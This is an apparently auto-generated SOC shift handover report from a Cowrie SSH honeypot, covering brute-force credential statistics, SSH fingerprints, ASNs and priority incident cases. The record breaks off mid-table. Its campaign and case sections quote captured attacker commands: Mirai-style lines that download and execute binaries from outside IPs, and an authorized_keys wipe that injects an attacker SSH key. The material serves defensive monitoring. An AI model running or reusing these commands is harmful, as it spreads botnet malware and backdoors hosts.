# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-10-27 |
| **Generated At** | 2026-10-27T17:01:59Z |
| **Shift Time** | 17:01 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **615** |
| Confirmed Threats | **532** |
| False Positives Filtered | **83** (13.5%) |
| Unique Attacker IPs | **343** |
| Countries of Origin | **56** |
| High Severity Cases | **344** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **271** |
| Malware Samples Analyzed | **9** HIGH · **26** MED · 0 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **28477** |
| Unique Credential Pairs | **24534** |
| Unique Usernames | **667** |
| Unique Passwords | **23917** |
| Successful Auth Pairs | **28103** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 25101 |
| `ubuntu` | 238 |
| `345gs5662d34` | 160 |
| `ssh` | 108 |
| `admin` | 107 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `123456` | 249 |
| `345gs5662d34` | 160 |
| `3245gs5662d34` | 155 |
| `123` | 129 |
| `1234` | 93 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 160 |
| `root` | `3245gs5662d34` | 103 |
| `support` | `support` | 46 |
| `root` | `` | 15 |
| `root` | `123456` | 11 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `alfredo` | `10.0.0.73` | 2026-10-27T00:55:05 |
| `root` | `aishiteru` | `10.0.0.73` | 2026-10-27T00:55:09 |
| `root` | `aaaaaaaaaa1` | `10.0.0.73` | 2026-10-27T00:55:11 |
| `root` | `FLORENCE` | `10.0.0.73` | 2026-10-27T00:55:14 |
| `root` | `900cbr` | `10.0.0.73` | 2026-10-27T00:55:16 |
| `root` | `234561` | `10.0.0.73` | 2026-10-27T00:55:18 |
| `root` | `170289` | `10.0.0.73` | 2026-10-27T00:55:21 |
| `root` | `1418` | `10.0.0.73` | 2026-10-27T00:55:23 |
| `root` | `123147` | `10.0.0.73` | 2026-10-27T00:55:25 |
| `root` | `0707071` | `10.0.0.73` | 2026-10-27T00:55:28 |
| `root` | `001982` | `10.0.0.73` | 2026-10-27T00:55:30 |
| `root` | `wilfrid` | `10.0.0.73` | 2026-10-27T00:55:33 |
| `root` | `Admin@123#` | `164.30.17.82` | 2026-10-27T00:55:34 |
| `root` | `vivian` | `10.0.0.73` | 2026-10-27T00:55:35 |
| `root` | `tourisme` | `10.0.0.73` | 2026-10-27T00:55:38 |
| `root` | `tinou` | `10.0.0.73` | 2026-10-27T00:55:41 |
| `root` | `theresa` | `10.0.0.73` | 2026-10-27T00:55:44 |
| `root` | `templier` | `10.0.0.73` | 2026-10-27T00:55:46 |
| `root` | `tanginamo1` | `10.0.0.73` | 2026-10-27T00:55:49 |
| `root` | `sur` | `10.0.0.73` | 2026-10-27T00:55:51 |
_… 28083 more successful pair(s) in credentials.json_

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **615** |
| Sessions with Fingerprint | **31** |
| Unique HASSH Fingerprints | **31** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 250 |
| Go SSH scanner | 101 |
| OpenSSH | 15 |
| Paramiko (Python) | 6 |
| PuTTY | 5 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 213 | 113 |
| `2ec37a7cc8da...` | Mirai/variant | 37 | 4 |
| `03a80b21afa8...` | Modern SSH client | 14 | 8 |
| `390ffe68a68c...` | Modern SSH client | 13 | 4 |
| `0a07365cc01f...` | Generic scanner | 10 | 3 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 213 | 113 | Mirai/variant |
| `2ec37a7cc8da...` | Go SSH scanner | 37 | 4 | Mirai/variant |
| `95420f9d932d...` | libssh | 18 | 10 | — |
| `03a80b21afa8...` | libssh | 14 | 8 | Modern SSH client |
| `390ffe68a68c...` | OpenSSH | 13 | 4 | Modern SSH client |
| `0a07365cc01f...` | Go SSH scanner | 10 | 3 | Generic scanner |
| `98ddc5604ef6...` | Go SSH scanner | 8 | 1 | Modern SSH client |
| `e54ef3ec27fe...` | Go SSH scanner | 8 | 8 | Generic scanner |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **59** |
| Campaign Clusters | **5** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Mirai/IoT Botnet** | 🔴 HIGH | 8 | 1 | `T1105, T1140, T1059.004` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1105, T1083, T1082, T1140` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 2 | 1 | `T1082, T1105, T1059.004` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 101 | 100 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
cd /tmp || cd /var || cd /dev/shm || cd /mnt ; ( wget -q -O main_arm7 http://152.42.195.115:80/main_arm7 || busybox wget http://152.42.195.115:80/main_arm7 -O main_arm7 || curl -s -O http://152.42.195.115:80/main_arm7 || tftp -g -b 1468 -r main_arm7 -l main_arm7 152.42.195.115 69 || tftp -g -r main_arm7 -l main_arm7 152.42.195.115 || busybox tftp -g -r main_arm7 152.42.195.115 || ftpget -v -u anonymous -p a 152.42.195.115 main_arm7 main_arm7 ) 2>/dev/null; chmod 777 main_arm7; (./main_arm7 main_arm7 </dev/n
```
```
wget -q -O main_arm7 http://152.42.195.115:80/main_arm7
```
```
busybox wget http://152.42.195.115:80/main_arm7 -O main_arm7
```
```
curl -s -O http://152.42.195.115:80/main_arm7
```
```
tftp -g -b 1468 -r main_arm7 -l main_arm7 152.42.195.115 69
```
Source IPs: `152.42.223.6`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo -e "pass123\ny0zPyj60beEg\ny0zPyj60beEg"|passwd|bash
```
```
Enter new UNIX password:
```
Source IPs: `113.140.0.186`

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
echo SHELL_TEST
```
```
uname -m; cat /etc/os-release 2>/dev/null | head -2
```
```
(wget -q http://180.93.193.100/arm7 -O /tmp/.arm7 || curl -s http://180.93.193.100/arm7 -o /tmp/.arm7 || busybox wget http://180.93.193.100/arm7 -O /tmp/.arm7) >/dev/null 2>&1
```
```
wget -q http://180.93.193.100/arm7 -O /tmp/.arm7
```
```
curl -s http://180.93.193.100/arm7 -o /tmp/.arm7
```
Source IPs: `180.93.193.100`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **343** |
| Unique ASNs | **144** |
| High-Risk ASNs | **108** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS0` |  | 71 | HIGH |
| `AS31898` | Oracle Corporation | 20 | HIGH |
| `AS4134` | CHINANET BACKBONE | 14 | HIGH |
| `AS14061` | DigitalOcean, LLC | 13 | HIGH |
| `AS396982` | Google LLC | 12 | HIGH |
| `AS398324` | Censys, Inc. | 8 | HIGH |
| `AS8075` | Microsoft Corporation | 8 | HIGH |
| `AS135377` | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | 7 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (332)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-ef8e85e26608

| Field | Detail |
|---|---|
| **Source IP** | `164.30.17[.]82` |
| **First Seen** | 2026-10-27 00:55 |
| **Last Seen** | 2026-10-27 00:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-27 00:55:34` | `cowrie.session.connect` |
| `2026-10-27 00:55:34` | `cowrie.client.version` |
| `2026-10-27 00:55:34` | `cowrie.client.kex` |
| `2026-10-27 00:55:34` | `cowrie.login.success` |
| `2026-10-27 00:55:35` | `cowrie.session.params` |
| `2026-10-27 00:55:35` | `cowrie.command.input` |
| `2026-10-27 00:55:35` | `cowrie.log.closed` |
| `2026-10-27 00:55:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `164.30.17[.]82` to AbuseIPDB if not already reported
- [ ] Block `164.30.17[.]82` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4a432e22ba99

| Field | Detail |
|---|---|
| **Source IP** | `78.135.111[.]65` |
| **First Seen** | 2026-10-27 00:57 |
| **Last Seen** | 2026-10-27 00:57 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-27 00:57:20` | `cowrie.session.connect` |
| `2026-10-27 00:57:20` | `cowrie.client.version` |
| `2026-10-27 00:57:20` | `cowrie.client.kex` |
| `2026-10-27 00:57:21` | `cowrie.login.success` |
| `2026-10-27 00:57:22` | `cowrie.session.params` |
| `2026-10-27 00:57:22` | `cowrie.command.input` |
| `2026-10-27 00:57:22` | `cowrie.command.failed` |
| `2026-10-27 00:57:22` | `cowrie.log.closed` |
| `2026-10-27 00:57:23` | `cowrie.session.params` |
| `2026-10-27 00:57:23` | `cowrie.command.input` |
| `2026-10-27 00:57:23` | `cowrie.session.file_download` |
| `2026-10-27 00:57:23` | `cowrie.log.closed` |
| `2026-10-27 00:57:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `78.135.111[.]65` to AbuseIPDB if not already reported
- [ ] Block `78.135.111[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-48fa91625cd6

| Field | Detail |
|---|---|
| **Source IP** | `78.135.111[.]65` |
| **First Seen** | 2026-10-27 00:57 |
| **Last Seen** | 2026-10-27 00:57 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-27 00:57:23` | `cowrie.session.connect` |
| `2026-10-27 00:57:23` | `cowrie.client.version` |
| `2026-10-27 00:57:24` | `cowrie.client.kex` |
| `2026-10-27 00:57:24` | `cowrie.login.success` |
| `2026-10-27 00:57:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `78.135.111[.]65` to AbuseIPDB if not already reported
- [ ] Block `78.135.111[.]65` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7c289c0c0ffb

| Field | Detail |
|---|---|
| **Source IP** | `45.249.90[.]196` |
| **First Seen** | 2026-10-27 00:58 |
| **Last Seen** | 2026-10-27 00:58 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-27 00:58:17` | `cowrie.session.connect` |
| `2026-10-27 00:58:17` | `cowrie.client.version` |
| `2026-10-27 00:58:17` | `cowrie.client.kex` |
| `2026-10-27 00:58:17` | `cowrie.login.success` |
| `2026-10-27 00:58:18` | `cowrie.session.params` |
| `2026-10-27 00:58:18` | `cowrie.command.input` |
| `2026-10-27 00:58:18` | `cowrie.command.failed` |
| `2026-10-27 00:58:18` | `cowrie.log.closed` |
| `2026-10-27 00:58:19` | `cowrie.session.params` |
| `2026-10-27 00:58:19` | `cowrie.command.input` |
| `2026-10-27 00:58:19` | `cowrie.session.file_download` |
| `2026-10-27 00:58:19` | `cowrie.log.closed` |
| `2026-10-27 00:58:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.249.90[.]196` to AbuseIPDB if not already reported
- [ ] Block `45.249.90[.]196` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5dc26d4dae86

| Field | Detail |
|---|---|
| **Source IP** | `45.249.90[.]196` |
| **First Seen** | 2026-10-27 00:58 |
| **Last Seen** | 2026-10-27 00:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-27 00:58:19` | `cowrie.session.connect` |
| `2026-10-27 00:58:19` | `cowrie.client.version` |
| `2026-10-27 00:58:19` | `cowrie.client.kex` |
| `2026-10-27 00:58:19` | `cowrie.login.success` |
| `2026-10-27 00:58:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.249.90[.]196` to AbuseIPDB if not already reported
- [ ] Block `45.249.90[.]196` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5b58b03a8083

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]65` |
| **First Seen** | 2026-10-27 01:10 |
| **Last Seen** | 2026-10-27 01:10 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST, /bin/busybox TEST, cat /proc, ./` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-27 01:10:38` | `cowrie.session.connect` |
| `2026-10-27 01:10:39` | `cowrie.login.success` |
| `2026-10-27 01:10:40` | `cowrie.session.params` |
| `2026-10-27 01:10:40` | `cowrie.command.input` |
| `2026-10-27 01:10:41` | `cowrie.command.input` |
| `2026-10-27 01:10:41` | `cowrie.command.input` |
| `2026-10-27 01:10:42` | `cowrie.command.input` |
| `2026-10-27 01:10:42` | `cowrie.command.failed` |
| `2026-10-27 01:10:42` | `cowrie.log.closed` |
| `2026-10-27 01:10:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]65` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-702244ed0f19

| Field | Detail |
|---|---|
| **Source IP** | `180.93.193[.]100` |
| **First Seen** | 2026-10-27 01:34 |
| **Last Seen** | 2026-10-27 01:34 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST, uname -m; cat /etc/os-release 2>/dev/null | head -2, (wget -q hxxp://180.93.193[.]100/arm7 -O /tmp/.arm7 || curl -s hxxp://180.93.193[.]100/arm7 -o /tmp/.arm7 || busybox wget hxxp://180.93.193[.]100/arm7 -O /tmp/.arm7) >/dev/null 2>&1, wget -q hxxp://180.93.193[.]100/arm7 -O /tmp/.arm7, curl -s hxxp://180.93.193[.]100/arm7 -o /tmp/.arm7` |
| **Download Attempts** | hxxp://180.93.193[.]100/arm7, hxxp://180.93.193[.]100/arm7, hxxp://180.93.193[.]100/arm7 |
| **TTPs (MITRE)** | T1078 · T1083 · T1105 · T1222.002 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-27 01:34:09` | `cowrie.session.connect` |
| `2026-10-27 01:34:10` | `cowrie.login.success` |
| `2026-10-27 01:34:11` | `cowrie.session.params` |
| `2026-10-27 01:34:11` | `cowrie.command.input` |
| `2026-10-27 01:34:11` | `cowrie.command.input` |
| `2026-10-27 01:34:13` | `cowrie.command.input` |
| `2026-10-27 01:34:13` | `cowrie.command.input` |
| `2026-10-27 01:34:13` | `cowrie.command.input` |
| `2026-10-27 01:34:13` | `cowrie.command.input` |
| `2026-10-27 01:34:13` | `cowrie.command.success` |
| `2026-10-27 01:34:14` | `cowrie.session.file_download` |
| `2026-10-27 01:34:14` | `cowrie.session.file_download.failed` |
| `2026-10-27 01:34:14` | `cowrie.session.file_download` |
| `2026-10-27 01:34:14` | `cowrie.session.file_download.failed` |
| `2026-10-27 01:34:14` | `cowrie.session.file_download` |
| … | _6 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `180.93.193[.]100` to AbuseIPDB if not already reported
- [ ] Block `180.93.193[.]100` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e8cedc892383

| Field | Detail |
|---|---|
| **Source IP** | `152.42.223[.]6` |
| **First Seen** | 2026-10-27 01:45 |
| **Last Seen** | 2026-10-27 01:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `root, echo PAYLOAD_WORKING` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-27 01:45:15` | `cowrie.session.connect` |
| `2026-10-27 01:45:16` | `cowrie.login.success` |
| `2026-10-27 01:45:16` | `cowrie.session.params` |
| `2026-10-27 01:45:16` | `cowrie.telnet.option` |
| `2026-10-27 01:45:16` | `cowrie.command.input` |
| `2026-10-27 01:45:16` | `cowrie.command.failed` |
| `2026-10-27 01:45:16` | `cowrie.command.input` |
| `2026-10-27 01:45:16` | `cowrie.command.input` |
| `2026-10-27 01:45:17` | `cowrie.log.closed` |
| `2026-10-27 01:45:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.42.223[.]6` to AbuseIPDB if not already reported
- [ ] Block `152.42.223[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b3e967f1049d

| Field | Detail |
|---|---|
| **Source IP** | `164.30.17[.]82` |
| **First Seen** | 2026-10-27 02:00 |
| **Last Seen** | 2026-10-27 02:00 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-27 02:00:45` | `cowrie.session.connect` |
| `2026-10-27 02:00:45` | `cowrie.client.version` |
| `2026-10-27 02:00:45` | `cowrie.client.kex` |
| `2026-10-27 02:00:47` | `cowrie.login.success` |
| `2026-10-27 02:00:48` | `cowrie.session.params` |
| `2026-10-27 02:00:48` | `cowrie.command.input` |
| `2026-10-27 02:00:48` | `cowrie.log.closed` |
| `2026-10-27 02:00:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `164.30.17[.]82` to AbuseIPDB if not already reported
- [ ] Block `164.30.17[.]82` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5e74b9daa32c

| Field | Detail |
|---|---|
| **Source IP** | `193.112.192[.]91` |
| **First Seen** | 2026-10-27 02:05 |
| **Last Seen** | 2026-10-27 02:10 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-27 02:05:16` | `cowrie.session.connect` |
| `2026-10-27 02:05:16` | `cowrie.client.version` |
| `2026-10-27 02:05:16` | `cowrie.client.kex` |
| `2026-10-27 02:05:18` | `cowrie.login.success` |
| `2026-10-27 02:10:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.112.192[.]91` to AbuseIPDB if not already reported
- [ ] Block `193.112.192[.]91` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-01c3187f286d

| Field | Detail |
|---|---|
| **Source IP** | `120.26.83[.]180` |
| **First Seen** | 2026-10-27 02:16 |
| **Last Seen** | 2026-10-27 02:16 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-27 02:16:55` | `cowrie.session.connect` |
| `2026-10-27 02:16:55` | `cowrie.client.version` |
| `2026-10-27 02:16:56` | `cowrie.client.kex` |
| `2026-10-27 02:16:58` | `cowrie.login.success` |
| `2026-10-27 02:16:59` | `cowrie.session.params` |
| `2026-10-27 02:16:59` | `cowrie.command.input` |
| `2026-10-27 02:16:59` | `cowrie.log.closed` |
| `2026-10-27 02:16:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.26.83[.]180` to AbuseIPDB if not already reported
- [ ] Block `120.26.83[.]180` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b2e4a9535ff7

| Field | Detail |
|---|---|
| **Source IP** | `77.90.185[.]17` |
| **First Seen** | 2026-10-27 02:21 |
| **Last Seen** | 2026-10-27 02:21 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-27 02:21:40` | `cowrie.session.connect` |
| `2026-10-27 02:21:40` | `cowrie.client.version` |
| `2026-10-27 02:21:40` | `cowrie.client.kex` |
| `2026-10-27 02:21:41` | `cowrie.login.success` |
| `2026-10-27 02:21:42` | `cowrie.direct-tcpip.request` |
| `2026-10-27 02:21:43` | `cowrie.direct-tcpip.ja4` |
| `2026-10-27 02:21:43` | `cowrie.direct-tcpip.data` |
| `2026-10-27 02:21:45` | `cowrie.direct-tcpip.request` |
| `2026-10-27 02:21:46` | `cowrie.direct-tcpip.ja4` |
| `2026-10-27 02:21:46` | `cowrie.direct-tcpip.data` |
| `2026-10-27 02:21:47` | `cowrie.direct-tcpip.request` |
| `2026-10-27 02:21:47` | `cowrie.direct-tcpip.ja4` |
| `2026-10-27 02:21:47` | `cowrie.direct-tcpip.data` |
| `2026-10-27 02:21:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.90.185[.]17` to AbuseIPDB if not already reported
- [ ] Block `77.90.185[.]17` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f079b8cfd9ef

| Field | Detail |
|---|---|
| **Source IP** | `194.164.107[.]6` |
| **First Seen** | 2026-10-27 02:41 |
| **Last Seen** | 2026-10-27 02:41 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/153.0.0[.]0 Safari/537.36, Accept: */*, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-27 02:41:24` | `cowrie.session.connect` |
| `2026-10-27 02:41:24` | `cowrie.login.success` |
| `2026-10-27 02:41:24` | `cowrie.session.params` |
| `2026-10-27 02:41:24` | `cowrie.command.input` |
| `2026-10-27 02:41:24` | `cowrie.command.input` |
| `2026-10-27 02:41:24` | `cowrie.command.failed` |
| `2026-10-27 02:41:24` | `cowrie.command.input` |
| `2026-10-27 02:41:24` | `cowrie.command.failed` |
| `2026-10-27 02:41:24` | `cowrie.command.input` |
| `2026-10-27 02:41:25` | `cowrie.log.closed` |
| `2026-10-27 02:41:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `194.164.107[.]6` to AbuseIPDB if not already reported
- [ ] Block `194.164.107[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-05b915ce3ef2

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-10-27 02:43 |
| **Last Seen** | 2026-10-27 02:45 |
| **Session Duration** | 154s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_1f4aecfc4aa5db1ca74c43d8c88a709d_small_control'"'"' '"'"'check_1f4aecfc4aa5db1ca74c43d8c88a709d'"'"'', printf '\n%s|%s\n' 'check_1f4aecfc4aa5db1ca74c43d8c88a709d_small_control' 'check_1f4aecfc4aa5db1ca74c43d8c88a709d', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_1f4aecfc4aa5db1ca74c43d8c88a709d_small_math'"'"' "$((35*218+57))"', (35*218+57, printf '\n%s|%s\n' 'check_1f4aecfc4aa5db1ca74c43d8c88a709d_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
